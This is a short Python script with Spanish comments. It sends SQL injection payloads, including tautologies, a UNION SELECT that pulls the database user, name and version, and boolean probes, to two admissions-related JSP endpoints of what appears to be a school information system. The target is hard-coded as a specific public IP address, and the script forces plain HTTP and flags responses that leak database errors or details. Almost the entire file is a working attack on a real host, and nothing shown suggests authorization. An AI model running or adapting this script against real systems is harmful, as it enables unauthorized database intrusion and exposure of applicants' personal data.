import requests
import sys

class SQLInjectionExploiter:
    def __init__(self, target):
        # Usar HTTP en lugar de HTTPS para evitar errores de certificado
        self.target = target.replace('https://', 'http://').rstrip('/')
        self.session = requests.Session()
    
    def test_sql_injection(self):
        """Probar SQL Injection en endpoints conocidos"""
        print("[+] Probando SQL Injection (HTTP)...")
        
        endpoints = [
            '/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp',
            '/jsp/escolar/muestra_bachillerato_ajax.jsp'
        ]
        
        payloads = [
            "1",
            "1'", 
            "1' OR '1'='1'-- ",
            "1' UNION SELECT user(),database(),version()-- ",
            "1' AND 1=1-- ",
            "1' AND 1=2-- "
        ]
        
        for endpoint in endpoints:
            print(f"\n🔍 Endpoint: {endpoint}")
            
            for payload in payloads:
                try:
                    url = f"{self.target}{endpoint}?xCveBachillerato={payload}"
                    response = self.session.get(url, timeout=10)
                    
                    print(f"Payload: {payload[:30]}... -> Status: {response.status_code}, Size: {len(response.text)}")
                    
                    if response.status_code == 200 and len(response.text) > 0:
                        # Buscar indicadores de SQLi
                        if "error" in response.text.lower():
                            print("   ⚠️  Posible error de SQL")
                        elif "mysql" in response.text.lower() or "ora" in response.text.lower():
                            print("   🚨 Posible información de BD")
                        
                        # Mostrar parte de la respuesta
                        if len(response.text) < 500:
                            print(f"   Response: {response.text}")
                            
                except Exception as e:
                    print(f"Error: {e}")

# Ejecutar
sqli = SQLInjectionExploiter("http://189.254.143.102")
sqli.test_sql_injection()